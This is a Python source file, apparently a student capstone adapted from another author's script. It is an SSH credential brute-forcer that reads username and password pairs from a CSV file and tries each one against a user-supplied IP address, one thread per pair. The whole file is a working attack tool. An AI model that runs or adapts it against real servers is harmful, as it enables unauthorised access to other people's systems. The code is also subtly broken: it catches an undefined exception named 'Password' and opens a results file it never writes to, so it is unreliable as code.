import csv
import ipaddress
import threading
import time
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import logging



"""This is an edited version of a script originally written by David bomball all credit goes to him. I have added in some of my own functions as well as working with his. This script is a very simple way to bruteforce credentials for an SSH server
Class: Capstone
Student: Patrick Mitchell
Professor: Anup Parajuli
School: Lake Superior College

""" 



def banner():
        time.sleep(1)
        print(r"""


  11111   11111  1     1                                             
 1     1 1     1 1     1    11111  11111  1    1 11111 111111 11111  
 1       1       1     1    1    1 1    1 1    1   1   1      1    1 
  11111   11111  1111111    11111  1    1 1    1   1   11111  1    1 
       1       1 1     1    1    1 11111  1    1   1   1      11111  
 1     1 1     1 1     1    1    1 1   1  1    1   1   1      1   1  
  11111   11111  1     1    11111  1    1  1111    1   111111 1    1



  """)



def connection(host, username, password):
        ssh_client = SSHClient()
        
        ssh_client.set_missing_host_key_policy(AutoAddPolicy())#This function is to add your key automatically
        try:
        
            ssh_client.connect(host,port=22,username=username, password=password, banner_timeout=300)
       
            with open("ssh_password.txt", "a") as blank:
            
                print(f"Username - {username} and Password - {password} found.")
            
        except AuthenticationException:#This is error handling for if a attempted password is incorrect
            print(f"Username - {username} and Password - {password} is Incorrect.")
        except Password:#This exception is what will show the correct password
            print(f"Username - {username} and Password - {password} found.")
        
            


def ip_address():

    while True:
        host = input("Enter the Ip address of your targeted SSH server: ")
        try:
            
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            
            print("Your Ip address either doesn't exist or is incorrect, try again")
            
        

# This is the main function designed to start using csv reader to attempt connections using threading with different passwords in the csv file
def hook():
    
    list_file="passwords.csv"
    host = ip_address()
    

    with open(list_file) as blank:
        csv_reader = csv.reader(blank, delimiter=",")
        #This allows the program to read passwords from the passwords.csv file
        for index, row in enumerate(csv_reader):
            
            if index == 0:
                continue
            else:
                thread = threading.Thread(target=connection, args=(host, row[0], row[1],))
                
                thread.start()
                
                time.sleep(.25)
         



                
            

#  We run the main function where execution starts.
banner()
hook()


